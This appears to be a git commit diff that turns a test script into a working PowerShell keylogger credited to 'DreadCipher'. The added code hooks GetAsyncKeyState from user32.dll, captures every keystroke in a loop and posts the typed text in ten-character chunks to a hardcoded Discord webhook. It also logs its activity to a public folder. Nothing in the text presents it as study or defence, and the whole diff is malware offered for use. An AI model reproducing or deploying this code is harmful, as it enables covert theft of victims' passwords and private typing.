8d26cde69edc8116ff043729d595d5f7a43fc32a
Kaiondatwzck <103587362+Kaiondatwzck@users.noreply.github.com>
2025-03-31 11:12:09 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,10 +1,31 @@
-# Keylogger Test by DreadCipher
+# Keylogger with Discord by DreadCipher
 $webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
 
-try {
-    $payload = @{ content = "Keylogger is running!" } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
-    "Started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-} catch {
-    "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyHook {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
+$buffer = ""
+while ($true) {
+    Start-Sleep -Milliseconds 100
+    for ($key = 8; $key -le 254; $key++) {
+        if ([KeyHook]::GetAsyncKeyState($key) -eq -32767) {
+            $buffer += [char]$key
+            if ($buffer.Length -ge 10) {
+                try {
+                    $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
+                    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
+                    "Sent '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+                    $buffer = ""
+                } catch {
+                    "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
+                }
+            }
+        }
+    }
 }
